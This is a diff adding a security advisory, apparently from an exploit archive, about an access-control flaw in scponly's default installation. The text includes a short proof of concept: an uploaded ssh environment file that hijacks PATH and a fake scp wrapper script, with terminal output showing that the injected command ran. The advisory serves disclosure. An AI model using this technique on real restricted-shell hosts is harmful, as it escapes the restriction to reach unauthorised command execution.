@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/5526/info
+
+scponly is a freely available, open source restricted secure copy client. It is available for Unix and Linux operating systems.
+
+The default installation of scponly does not place sufficient access controls on the .ssh subdirectory. Due to this
+oversight, it is possible for a remote user to upload files which may allow command execution. This could lead to
+unintended command execution, and regular shell access to a vulnerable host.
+
+For example, the user could scp the following to
+$HOME/.ssh/environment:
+
+# ssh environment
+PATH=/home/myhomedir/:/usr/bin:/bin
+#end
+
+Subsequently, the user could upload the following file to their home
+directory, and call it scp:
+
+#!/bin/sh
+
+echo "I'm a bad boy" > /tmp/exploit
+/usr/bin/scp $@
+
+# end
+
+When they next scp a file:
+
+[root@restricted /tmp]
+# ls -l
+total 24
+-rw-r--r-- 1 bonehead bonehead 14 Aug 19 22:46 exploit
+[root@restricted /tmp]
+# cat exploit
+I'm a bad boy
